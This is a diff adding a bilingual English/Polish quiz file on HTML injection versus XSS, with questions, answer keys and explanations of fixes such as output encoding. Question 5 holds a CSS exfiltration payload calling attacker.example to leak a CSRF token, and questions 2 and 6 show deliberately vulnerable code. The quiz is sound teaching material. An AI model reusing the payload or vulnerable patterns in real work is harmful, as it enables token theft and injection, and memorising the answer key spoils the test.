@@ -1,0 +1,140 @@
+threatId: '1.24'
+title:
+  en: HTML Injection — knowledge check
+  pl: HTML Injection — sprawdzian wiedzy
+passScore: 80
+questions:
+- id: q1
+  type: multiple-choice
+  prompt:
+    en: What is the defining technical boundary between HTML injection and XSS?
+    pl: Jaka jest definiująca granica techniczna między HTML injection a XSS?
+  choices:
+  - id: a
+    label:
+      en: HTML injection only affects email clients, XSS only affects browsers
+      pl: HTML injection dotyczy tylko klientów pocztowych, XSS tylko przeglądarek
+  - id: b
+    label:
+      en: The injected markup renders in the page but no script executes; once script execution is reachable, it is XSS
+      pl: Wstrzyknięty znacznik renderuje się na stronie ale żaden skrypt się nie wykonuje; gdy wykonanie skryptu jest osiągalne, to jest XSS
+  - id: c
+    label:
+      en: HTML injection requires admin privileges, XSS does not
+      pl: HTML injection wymaga uprawnień administratora, XSS nie
+  correctChoiceIds:
+  - b
+  explanation:
+    en: 'Both classes share the identical root cause (unescaped output reaching an HTML rendering context) and the identical primary fix (context-aware encoding). The only difference is capability: HTML injection is markup-only (forms, iframes, meta-refresh, CSS, dangling markup); the moment a script tag or event handler executes, the finding escalates to XSS. MITRE itself folds both under CWE-79, and researchers routinely escalate HTML injection into full XSS to maximize bug-bounty impact — which is why all three independent research passes flagged this boundary as genuinely blurry rather than a hard categorical wall.'
+    pl: 'Obie klasy dzielą identyczną przyczynę źródłową (nieoescapowane wyjście trafiające do kontekstu renderowania HTML) i identyczną podstawową naprawę (kodowanie kontekstowe). Jedyna różnica to zdolność: HTML injection jest wyłącznie znacznikowe (formularze, iframe, meta-refresh, CSS, dangling markup); w momencie gdy tag script lub handler zdarzenia się wykonuje, odkrycie eskaluje do XSS. Sam MITRE zwija oba pod CWE-79, a badacze rutynowo eskalują HTML injection do pełnego XSS by zmaksymalizować wpływ w bug-bounty — dlatego wszystkie trzy niezależne badania oznaczyły tę granicę jako naprawdę rozmytą, nie twardy mur kategorii.'
+- id: q2
+  type: vuln-or-not
+  prompt:
+    en: Does this JavaScript snippet contain an HTML injection vulnerability?
+    pl: Czy ten fragment JavaScript zawiera podatność HTML injection?
+  snippet:
+    lang: javascript
+    code: document.getElementById("welcome").innerHTML = "Hello, " + userDisplayName;
+  isVulnerable: true
+  cwe: CWE-79
+  explanation:
+    en: Any attacker-controlled userDisplayName containing markup (e.g. a <form> pointed at an attacker endpoint) renders live via innerHTML with no escaping. The fix is document.getElementById(...).textContent, or a sanitizer with an explicit allowlist if some markup must be preserved.
+    pl: Każde userDisplayName kontrolowane przez atakującego zawierające znacznik (np. <form> wskazujący na endpoint atakującego) renderuje się na żywo przez innerHTML bez żadnego escapowania. Naprawą jest document.getElementById(...).textContent, albo sanitizer z jawną allowlistą jeśli pewien znacznik musi zostać zachowany.
+- id: q3
+  type: multiple-choice
+  prompt:
+    en: Why do all three independent research passes flag CWE-80 as a questionable mapping for pure (non-script) HTML injection?
+    pl: Dlaczego wszystkie trzy niezależne badania oznaczają CWE-80 jako wątpliwe mapowanie dla czystego (bez skryptu) HTML injection?
+  choices:
+  - id: a
+    label:
+      en: CWE-80's own MITRE definition is specifically about script-related tags, so it doesn't cleanly cover genuinely non-script markup injection
+      pl: Własna definicja MITRE dla CWE-80 dotyczy konkretnie tagów związanych ze skryptem, więc nie obejmuje czysto wstrzyknięcia znaczników bez skryptu
+  - id: b
+    label:
+      en: CWE-80 was withdrawn by MITRE and no longer exists
+      pl: CWE-80 zostało wycofane przez MITRE i już nie istnieje
+  - id: c
+    label:
+      en: CWE-80 only applies to mobile applications, never web applications
+      pl: CWE-80 dotyczy tylko aplikacji mobilnych, nigdy webowych
+  correctChoiceIds:
+  - a
+  explanation:
+    en: CWE-79 is the safe, defensible primary/parent mapping for this whole class. CWE-80 is commonly reached for as a "basic HTML injection" label, but its actual MITRE scope is script-related, making CWE-451 (UI Misrepresentation), CWE-1021 (rendered UI layers/frames), or CWE-116 (output encoding root cause) more precise choices depending on which variant is being reported.
+    pl: CWE-79 to bezpieczne, obronialne podstawowe/nadrzędne mapowanie dla całej tej klasy. CWE-80 jest często sięgane jako etykieta "podstawowego HTML injection", ale jego faktyczny zakres MITRE dotyczy skryptu, co czyni CWE-451 (UI Misrepresentation), CWE-1021 (renderowane warstwy/ramki UI) lub CWE-116 (przyczyna źródłowa kodowania wyjścia) precyzyjniejszymi wyborami w zależności od zgłaszanego wariantu.
+- id: q4
+  type: multiple-choice
+  prompt:
+    en: Why does "just block <script> tags" fail as a complete defense against HTML injection?
+    pl: Dlaczego "po prostu zablokuj tagi <script>" zawodzi jako kompletna obrona przed HTML injection?
+  choices:
+  - id: a
+    label:
+      en: Forms, iframes, meta-refresh redirects, CSS-based exfiltration, and dangling-markup exfiltration all achieve real impact without ever using a <script> tag
+      pl: Formularze, iframe, przekierowania meta-refresh, eksfiltracja przez CSS i eksfiltracja przez dangling markup wszystkie osiągają realny wpływ bez użycia tagu <script>
+  - id: b
+    label:
+      en: Browsers ignore <script>-blocking filters entirely
+      pl: Przeglądarki całkowicie ignorują filtry blokujące <script>
+  - id: c
+    label:
+      en: It works fine — this is actually a complete and sufficient defense
+      pl: Działa dobrze — to w rzeczywistości kompletna i wystarczająca obrona
+  correctChoiceIds:
+  - a
+  explanation:
+    en: 'This is the single most common naive fix, ranked lowest (~20% effective) among defenses precisely because it leaves the entire non-script variant class open: a phishing <form>, a clickjacking-adjacent <iframe>, a <meta> redirect, and CSS-selector-based data exfiltration none require a <script> tag at all. The real fix is context-aware output encoding, which removes the ability to inject any tag.'
+    pl: 'To najczęstsza naiwna naprawa, oceniona najniżej (~20% skuteczności) wśród obron dokładnie dlatego, że zostawia całą klasę wariantów bez skryptu otwartą: phishingowy <form>, <iframe> zbliżony do clickjackingu, przekierowanie <meta> i eksfiltracja danych oparta na selektorach CSS — żaden z nich w ogóle nie wymaga tagu <script>. Prawdziwą naprawą jest kontekstowe kodowanie wyjścia, które usuwa możliwość wstrzyknięcia jakiegokolwiek tagu.'
+- id: q5
+  type: vuln-or-not
+  prompt:
+    en: A CSP with script-src 'self' and no unsafe-inline is deployed. Does this fully close the HTML injection point below?
+    pl: Wdrożono CSP z script-src 'self' i bez unsafe-inline. Czy to w pełni zamyka poniższy punkt HTML injection?
+  snippet:
+    lang: html
+    code: <style>input[name=csrf][value^="a"]{background:url(//attacker.example/log?c=a)}</style>
+  isVulnerable: true
+  cwe: CWE-79
+  explanation:
+    en: No — a script-focused CSP does not restrict <style> tags or CSS attribute-selector requests by default, so blind CSS exfiltration (PortSwigger's own 2023 research) still works exactly as shown, leaking page content character-by-character via background-image requests. Closing this specific variant requires a style-src restriction or, better, removing the ability to inject the <style> tag at all via output encoding.
+    pl: Nie — CSP skupione na skryptach domyślnie nie ogranicza tagów <style> ani żądań opartych na selektorach atrybutów CSS, więc ślepa eksfiltracja przez CSS (własne badanie PortSwigger z 2023) wciąż działa dokładnie jak pokazano, wyciekając zawartość strony znak po znaku przez żądania background-image. Zamknięcie tego konkretnego wariantu wymaga ograniczenia style-src lub, lepiej, usunięcia możliwości wstrzyknięcia tagu <style> w ogóle przez kodowanie wyjścia.
+- id: q6
+  type: pick-the-fix
+  prompt:
+    en: This PHP snippet reflects a name parameter into a welcome banner. Which variant actually fixes the HTML injection risk?
+    pl: Ten fragment PHP odbija parametr name w banerze powitalnym. Który wariant faktycznie naprawia ryzyko HTML injection?
+  variants:
+  - id: v1
+    lang: php
+    code: '<?php
+
+      // strip only the literal substring "<script" before echoing
+
+      $clean = str_ireplace("<script", "", $_GET["name"]);
+
+      echo "Welcome, " . $clean;
+
+      ?>'
+  - id: v2
+    lang: php
+    code: '<?php
+
+      echo "Welcome, " . htmlspecialchars($_GET["name"], ENT_QUOTES, "UTF-8");
+
+      ?>'
+  - id: v3
+    lang: php
+    code: '<?php
+
+      // only allow names shorter than 50 characters
+
+      $name = substr($_GET["name"], 0, 50);
+
+      echo "Welcome, " . $name;
+
+      ?>'
+  correctVariantId: v2
+  explanation:
+    en: v2 encodes every HTML-significant character (<, >, ", ', &) so the browser can never interpret the output as a tag at all — closing every variant, not just script tags. v1's substring blacklist only targets <script and leaves <form>, <iframe>, <meta>, and <style> completely open, plus is trivially bypassed by case/whitespace tricks. v3's length cap says nothing about the actual content and still echoes raw, unescaped markup.
+    pl: v2 koduje każdy znak istotny dla HTML (<, >, ", ', &), więc przeglądarka nigdy nie może zinterpretować wyjścia jako tagu w ogóle — zamykając każdy wariant, nie tylko tagi script. Blacklista podciągu z v1 celuje tylko w <script i zostawia <form>, <iframe>, <meta> i <style> całkowicie otwarte, a dodatkowo jest trywialnie omijana sztuczkami wielkości liter/białych znaków. Limit długości z v3 nic nie mówi o faktycznej treści i wciąż wypisuje surowy, nieoescapowany znacznik.
